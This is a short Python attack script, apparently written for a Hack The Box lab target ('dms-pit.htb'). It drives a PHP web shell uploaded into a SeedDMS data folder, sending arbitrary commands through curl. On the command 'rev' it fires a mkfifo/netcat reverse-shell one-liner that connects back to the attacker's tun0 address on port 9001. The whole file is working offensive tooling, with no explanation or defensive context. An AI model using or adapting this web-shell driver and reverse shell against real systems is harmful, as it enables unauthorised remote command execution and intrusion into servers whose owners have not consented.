#!/usr/bin/python3

import os
import urllib.parse
import netifaces as ni


url = 'http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?c='

class WebShell(object):
	def WriteCmd(self, cmd):
		urlencoded_cmd = urllib.parse.quote_plus(cmd)
		os.system("curl {}".format(url + urlencoded_cmd))

	def mkfifoShell(self):
		# get nc mkfifo shell
		ni.ifaddresses('tun0')
		ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
		rev_cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} 9001 >/tmp/f'.format(ip)
		self.WriteCmd(rev_cmd)


prompt = 'PHP Simple Shell [>] '
S = WebShell()
while True:
	cmd = input(prompt)
	if cmd == 'rev':
		S.mkfifoShell()
	else:
		S.WriteCmd(cmd)
